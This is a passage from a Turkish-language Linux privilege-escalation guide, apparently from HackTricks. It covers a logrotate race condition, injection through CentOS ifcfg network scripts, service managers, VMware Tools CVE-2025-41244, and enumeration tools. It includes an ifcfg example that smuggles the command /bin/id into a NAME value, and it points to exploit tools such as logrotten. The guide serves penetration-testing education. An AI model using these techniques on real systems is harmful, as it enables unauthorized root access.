Ayrıcalıklı bir `logrotate` işi, yalnızca düşük yetkili bir kullanıcının döndürme sırasında değiştirebildiği veya yönlendirebildiği bir dizin altındaki günlüğü gerçekten döndürdüğünde kullanıcılar arası bir dosya yazma yolu oluşturabilir. Tek başına yazılabilir bir günlük, yalnızca incelemeye değer bir ipucudur. Etkin kuralı ve `create`, `olddir` ve `su` yönergelerini; zamanlayıcının etkin kimliğini; günlüğün üst dizinindeki yazma ve arama izinlerini; ayrıca kurulu derlemenin ve politikanın hedef değişikliğine izin verip vermediğini doğrulayın. Ayrıcalıklı bir kabuğun daha sonra oluşan dosyayı yüklemesi de gerekir; ancak bu durumda başlangıç dosyasına yazma, komut yürütmeye dönüşür. Döndürme işlemini tetiklemeden veya yarış koşulunu denemeden zamanlamayı, kuralı, sürümü/paketlemeyi ve yol meta verilerini inceleyin.

> [!TIP]
> `3.18.0` sürümünü veya tek başına herhangi bir sürüm dizgesini istismar edilebilirlik sınırı olarak değerlendirmeyin. [Upstream değişiklik günlüğünde](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) birden çok sürümde dizin ve sembolik bağlantı güvenlik iyileştirmeleri kaydedilmiştir; dağıtımlar da düzeltmeleri geriye dönük olarak uygulayabilir. [Upstream kılavuzu](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in), ayrıcalıksız kullanıcıların denetimindeki dizinlerde root günlükleri döndürürken `su` kullanılmasını önerir; etkin kuralı ve gerçek davranışı doğrulayın.

Güvenlik açığı hakkında daha ayrıntılı bilgi şu sayfada bulunabilir: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Bu güvenlik açığını [**logrotten**](https://github.com/whotwagner/logrotten) ile istismar edebilirsiniz.

Bu güvenlik açığı [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx günlükleri)** ile çok benzerdir. Bu nedenle günlükleri değiştirebildiğinizi fark ettiğinizde, bu günlükleri kimin yönettiğini kontrol edin ve günlükleri sembolik bağlantılarla değiştirerek ayrıcalıklarınızı yükseltip yükseltemeyeceğinizi inceleyin.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Güvenlik açığı referansı:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Düşük yetkili bir kullanıcı bir `ifcfg-*` dosyasını oluşturabiliyor veya değiştirebiliyorsa **ve** ayrıcalıklı bir ağ etkinleştirme yolu tam olarak bu dosyayı okuyacaksa, bu dosya incelenmesi gereken bir ipucudur. Etkin dosya ve dizin izinlerini, seçili arayüzü, kurulu `ifup`/`ifdown` uygulamasını ve bunları kimin çalıştırdığını doğrulayın. Tek başına yazılabilir bir dosya kod yürütülmesine yol açmaz. [Red Hat'ın RHEL 7 ağ kılavuzu](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files), eski ağ betikleriyle NetworkManager arasındaki farkı açıklar: NetworkManager tek başına eski betikleri tetiklemez. [RHEL 8 belgelerinde](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) varsayılan `ifup`/`ifdown` uygulamalarının NetworkManager'ı kullandığı, isteğe bağlı eski paketinse kabuk betikleri sağladığı belirtilir.

Ayrıcalıklı eski betikleri gerçekten kullanan bir sistemde, tırnak içine alınmamış ve kabuğun kaynak olarak yüklediği `ifcfg-*` ataması (örneğin `NAME=`) bir kod yürütme sınırını aşabilir. Tam ayrıştırıcıyı, değeri ve etkinleştirme yolunu doğrulayın; dosya adından veya NetworkManager'ın varlığından kabuğun bu değeri yorumladığı sonucunu çıkarmayın. Arayanın girdisini bir `ifcfg-*` dosyasına yazan ve ardından eski `ifup` komutunu çağıran, sudo ile çalıştırılmasına izin verilmiş bir sarmalayıcı; arayan dosyayı doğrudan düzenleyemese bile bu sınıra ulaşmanın ayrı bir yoludur.

Örneğin: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Network ile /bin/id arasındaki boşluğa dikkat edin_)

### **init, init.d, systemd ve rc.d**

`/etc/init.d` dizini, **klasik Linux hizmet yönetimi sistemi** olan System V init (SysVinit) için **betiklere** ev sahipliği yapar. Hizmetleri `start`, `stop`, `restart` ve bazen `reload` etmek için betikler içerir. Bunlar doğrudan veya `/etc/rc?.d/` içinde bulunan sembolik bağlantılar aracılığıyla çalıştırılabilir. Redhat sistemlerinde alternatif yol `/etc/rc.d/init.d` şeklindedir.

Diğer yandan `/etc/init`, Ubuntu tarafından sunulan ve hizmet yönetimi görevleri için yapılandırma dosyaları kullanan daha yeni bir **hizmet yönetimi** sistemi olan **Upstart** ile ilişkilidir. Upstart’a geçişe rağmen, Upstart’taki uyumluluk katmanı sayesinde SysVinit betikleri Upstart yapılandırmalarının yanında kullanılmaya devam eder.

**systemd**, isteğe bağlı daemon başlatma, automount yönetimi ve sistem durumu anlık görüntüleri gibi gelişmiş özellikler sunan modern bir başlatma ve hizmet yöneticisi olarak ortaya çıkar. Dağıtım paketleri için `/usr/lib/systemd/`, yönetici değişiklikleri için `/etc/systemd/system/` dizinlerini kullanarak sistem yönetimi sürecini kolaylaştırır.<sup>[[21]](#references)</sup>

## Diğer Hileler

### NFS ayrıcalık yükseltme


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Kısıtlı Shell'lerden kaçış


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting framework'leri: manager-channel kötüye kullanımı

Android rooting framework'leri, ayrıcalıklı kernel işlevlerini userspace yöneticisine sunmak için genellikle bir syscall'a hook uygular. Zayıf yönetici kimlik doğrulaması (ör. FD sırasına dayalı imza denetimleri veya zayıf parola düzenleri), yerel bir uygulamanın yöneticiyi taklit etmesine ve zaten root edilmiş cihazlarda root ayrıcalıklarına yükselmesine olanak sağlayabilir. Daha fazla bilgi ve exploit ayrıntılarına buradan ulaşabilirsiniz:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Regex tabanlı exec aracılığıyla VMware Tools hizmet keşfi LPE (CWE-426) (CVE-2025-41244)

VMware Tools/Aria Operations'taki regex tabanlı hizmet keşfi, işlem komut satırlarından bir binary yolu çıkarıp bu yolu ayrıcalıklı bağlamda -v ile çalıştırabilir. İzin verici desenler (ör. \S kullanımı), saldırganların yazılabilir konumlara (ör. /tmp/httpd) yerleştirdiği listener'larla eşleşebilir ve root olarak kod çalıştırılmasına yol açabilir (CWE-426 Güvenilmeyen Arama Yolu).<sup>[[27]](#references)</sup>

Diğer keşif/izleme yığınlarına da uygulanabilecek genelleştirilmiş bir örüntüyü öğrenmek ve görmek için:


{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Güvenlik Korumaları

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Araçları

### **Linux yerel ayrıcalık yükseltme vektörlerini aramak için en iyi araç:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t seçeneği)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux ve MAC'teki kernel açıklarını listeler [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (fiziksel erişim):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Daha fazla betiğin derlemesi**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning (Crontab UI ayrıcalık yükseltme, zip -P kimlik bilgilerini yeniden kullanma)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: cron tarafından çalıştırılan monitor için sahte .text_sig payload'u](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch atlatması (sudo env_keep PATH ele geçirme)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Temel Linux Ayrıcalık Yükseltme](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Linux Ayrıcalık Yükseltme Rehberi](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Saldır ve Savun: 2016'nın Linux Ayrıcalık Yükseltme Teknikleri](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Kimse komut çalıştırmayı beklemiyordu!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (Linux Ayrıcalık Yükseltme)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Laboratuvar Alıştırmaları Çözüm Rehberi - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: Linux ayrıcalık yükseltme için ipuçları ve püf noktaları](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: Linux numaralandırma ve ayrıcalık yükseltme aracı](https://github.com/rtcrowley/linux-private-i)
- [14] [Socket nedir?](https://www.linux.com/news/what-socket/)
- [15] [Peppo (Proving Grounds) çözüm yazısı](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [D-BUS'a giriş](https://www.linuxjournal.com/article/7744)
- [17] [SUID Çalıştırılabilir Dosyalarıyla Linux Ayrıcalık Yükseltme](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo Bölüm 2 – Linux Ayrıcalık Yükseltme](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Linux'ta ACL'ler nasıl yönetilir](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Network-scripts aracılığıyla Redhat/CentOS'ta root erişimi](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [systemd nedir?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (loglar üzerinden bash aritmetik enjeksiyonu, genel saldırı zinciri)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [GNU Bash Kılavuzu – BASH_ENV (etkileşimsiz başlangıç dosyası)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink ayrıcalık yükseltme)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (pg_basebackup cron kopyalama → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Adını ne koyarsanız koyun, VMware onu ayrıcalıklı çalıştırır (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: Sudo Chroot Ayrıcalık Yükseltmesi](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – CVE-2025-32462 ve CVE-2025-32463 Sudo ayrıcalık yükseltme açıkları](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – PYC Depo Dizinleri](https://peps.python.org/pep-3147/)
- [32] [Python importlib belgeleri](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [@paragonsec tarafından atılan Tweet](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Linux'ta parolaları kaydetme](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Logrotate yarış durumunun ayrıntıları](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
- [38] [Python 3.10 belgeleri – `site` ve yol yapılandırma dosyaları](https://docs.python.org/3.10/library/site.html)
- [39] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../../../banners/hacktricks-training.md}}
